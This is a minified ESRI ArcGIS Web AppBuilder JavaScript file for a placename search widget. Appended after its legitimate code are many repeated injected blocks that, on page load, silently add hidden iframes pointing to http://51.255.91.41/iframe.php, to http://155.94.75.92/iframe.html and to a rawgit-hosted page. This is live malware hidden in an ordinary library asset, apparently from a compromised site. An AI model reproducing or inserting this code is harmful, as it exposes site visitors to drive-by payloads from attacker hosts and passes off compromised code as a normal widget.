// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/placename/placename.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTSearchOuterContainer"\x3e\r\n    \x3cdiv class\x3d"esriCTSearchHeader"\x3e\r\n      ${nls.placenameWidget.placenameLabel}\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTSearchContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchDiv"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"searchWidgetContainer"\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/dom-construct dojo/query dojo/text!./placename.html dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/Evented jimu/BaseWidget ../search dojo/dom-geometry".split(" "),function(d,e,c,f,g,b,h,k,l,m){return d([k,g,h],{baseClass:"jimu-widget-screening-placename",_hasMultipleSourcesInSearch:!0,templateString:f,_windowResizeTimer:null,constructor:function(a){this._windowResizeTimer=null;b.mixin(this,a)},postCreate:function(){this._createSearchInstance()},_createSearchInstance:function(){this._searchInstance=
new l({searchOptions:{addLayersFromMap:!1,autoNavigate:!1,autoComplete:!0,minCharacters:0,maxLocations:5,searchDelay:100,enableHighlight:!1},config:this.config,appConfig:this.appConfig,nls:this.nls,map:this.map},e.create("div",{},this.searchWidgetContainer));this.own(this._searchInstance.on("select-result",b.hitch(this,function(a){this.emit("onSearchComplete",a)})));this.own(this._searchInstance.on("clear-search",b.hitch(this,this._clearResults)));this.own(this._searchInstance.on("search-loaded",
b.hitch(this,function(){setTimeout(b.hitch(this,function(){this._searchContainerNodeElement=c(".arcgisSearch .searchGroup .searchInput",this.domNode)[0];2>this._searchInstance.search.sources.length&&(this._hasMultipleSourcesInSearch=!1);this.onWindowResize()}),1E3)})));this._searchInstance.startup()},_clearResults:function(a){a||this.map.infoWindow.hide()},clearSearchText:function(){this._searchInstance&&this._searchInstance.search&&this._searchInstance.search.clear()},onWindowResize:function(){this._windowResizeTimer&&
clearTimeout(this._windowResizeTimer);this._windowResizeTimer=setTimeout(b.hitch(this,this._resetComponents),500)},_resetComponents:function(){var a,b;b=c(".arcgisSearch .searchGroup",this.domNode)[0];this._searchContainerNodeElement||(this._searchContainerNodeElement=c(".arcgisSearch .searchGroup .searchInput",this.domNode)[0]);this.widgetMainContainer&&this._searchContainerNodeElement&&(a=m.position(this.widgetMainContainer))&&a.w&&(a=a.w-162,this._hasMultipleSourcesInSearch||(a+=32),0<a&&(this._searchContainerNodeElement.style.setProperty("width",
a+"px","important"),b&&b.style.setProperty("max-width","100%","important")))},resetPlaceNameWidgetValues:function(){this.clearSearchText()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});